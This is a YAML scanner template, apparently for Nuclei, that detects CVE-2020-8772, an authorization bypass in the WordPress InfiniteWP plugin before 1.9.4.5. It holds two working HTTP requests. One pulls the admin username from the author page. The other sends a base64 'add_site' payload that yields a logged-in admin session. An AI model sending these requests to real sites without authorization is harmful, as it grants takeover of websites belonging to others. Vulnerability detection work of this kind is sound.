id: CVE-2020-8772
info:
  name: WordPress InfiniteWP <1.9.4.5 - Authorization Bypass
  author: princechaddha,scent2d
  severity: critical
  description: The WordPress InfiniteWP plugin before version 1.9.4.5 contains an
    authorization bypass vulnerability that allows attackers with knowledge of the
    administrator's username to obtain sensitive information, modify data, and execute
    unauthorized operations.
  remediation: Upgrade to InfiniteWP 1.9.4.5 or higher.
  reference:
  - https://wpscan.com/vulnerability/10011
  - https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/
  - https://wpvulndb.com/vulnerabilities/10011
  - https://nvd.nist.gov/vuln/detail/CVE-2020-8772
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-8772
    cwe-id: CWE-862
  metadata:
    verified: 'true'
    impact: The CVE-2020-8772 vulnerability in the WordPress InfiniteWP plugin could
      result in unauthorized access, modification of data, and execution of unauthorized
      operations by an attacker who knows the username of an administrator.
    recommendation: It is recommended to update the WordPress InfiniteWP plugin to
      version 1.9.4.5 or higher to mitigate the risk of an authorization bypass vulnerability
      that can allow an attacker to log in as an administrator and perform unauthorized
      actions.
  tags: wpscan,cve,cve2020,wordpress,wp-plugin,wp,infinitewp,auth-bypass
requests:
- raw:
  - 'GET /?author=1 HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Language: en-US,en;q=0.9

    '
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

    Content-Type: application/x-www-form-urlencoded


    _IWP_JSON_PREFIX_{{base64("{\"iwp_action\":\"add_site\",\"params\":{\"username\":\"{{username}}\"}}")}}

    '
  host-redirects: true
  extractors:
  - type: regex
    name: username
    internal: true
    group: 1
    part: body
    regex:
    - Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>
  - type: regex
    name: username
    internal: true
    group: 1
    part: header
    regex:
    - 'ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/'
  matchers-condition: and
  matchers:
  - type: word
    part: header
    words:
    - wordpress_logged_in
  - type: word
    words:
    - <IWPHEADER>
    part: body
  - type: status
    status:
    - 200
